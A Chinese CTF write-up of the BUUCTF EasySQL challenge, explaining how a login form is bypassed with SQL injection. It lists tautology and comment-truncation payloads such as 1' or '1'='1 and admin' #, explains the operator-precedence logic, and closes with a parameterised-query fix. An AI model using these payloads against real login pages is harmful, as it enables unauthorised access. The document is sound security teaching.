# CTF 练习：[极客大挑战 2019]EasySQL（万能密码）

> 平台：CTF² / BUUCTF 练习（Web · 简单 · 1 分，7690 人解出）
> 环境：Kali Linux + 浏览器 + curl
> 日期：2026-11-18
> 性质：平台提供的授权靶场

---

## 一、目标

登录框存在 SQL 注入，用「万能密码」绕过登录，拿到 flag。

## 二、过程

### 2.1 观察

打开靶机地址，是一个登录页面：

```
用户名 [        ]
密码   [        ]
[ 登录 ]
```

提交后请求形如：

```
GET /check.php?username=xxx&password=xxx
```

### 2.2 魔数测试

用户名和密码都输入：

```
1' or '1'='1
```

提交后页面显示 **Login Success!**，并直接给出 flag。

### 2.3 为什么能成

后端 SQL 大致是：

```sql
SELECT * FROM users WHERE username = '输入1' AND password = '输入2'
```

代入后变成：

```sql
SELECT * FROM users
WHERE username = '1' or '1'='1' AND password = '1' or '1'='1'
```

由于 `AND` 优先级高于 `OR`，整体等价于：

```sql
(username = '1') OR ('1'='1' AND password = '1') OR ('1'='1')
```

**最后一段 `'1'='1'` 恒真** → 整条 WHERE 恒真 → 返回第一条用户 → 登录成功。

### 2.4 备选 payload

| payload | 说明 |
|---|---|
| `1' or '1'='1` | 两字段都填，恒真 |
| `admin' #` | `#` 注释掉后面的密码判断 |
| `admin' or '1'='1' #` | 注释闭合 |
| `' or 1=1 -- ` | `-- ` 注释（注意尾部空格） |

## 三、原理

1. **字符串拼接**：用户输入直接拼进 SQL，没有参数化。
2. **恒真条件**：`'1'='1'` 让 WHERE 对整个表成立。
3. **注释截断**：`#` / `-- ` 把后面的条件注释掉，绕过密码校验。

## 四、修复

| 措施 | 说明 |
|---|---|
| **参数化查询** | PDO `prepare` + `bindParam`，数据不当代码 |
| 输入校验 | 用户名限制字符集、长度 |
| 错误信息 | 关闭详细 SQL 报错 |
| 最小权限 | 数据库账号只用得到必要表 |

```php
$stmt = $pdo->prepare('SELECT * FROM users WHERE username = :u AND password = :p');
$stmt->execute([':u' => $username, ':p' => $password]);
```

## 五、踩坑

- 两个输入框**都要填** payload，只填一个不够。
- 单引号会被 URL 编码（`%27`），浏览器自动处理，不用手动改。
- 如果页面提示格式限制，改用 `admin' #` 这种注释型。

## 六、收获

- 一道题把「恒真条件」和「注释截断」两种注入思路都复习了。
- 再次确认：**SQL 注入的根因永远是『数据被当成代码』**。
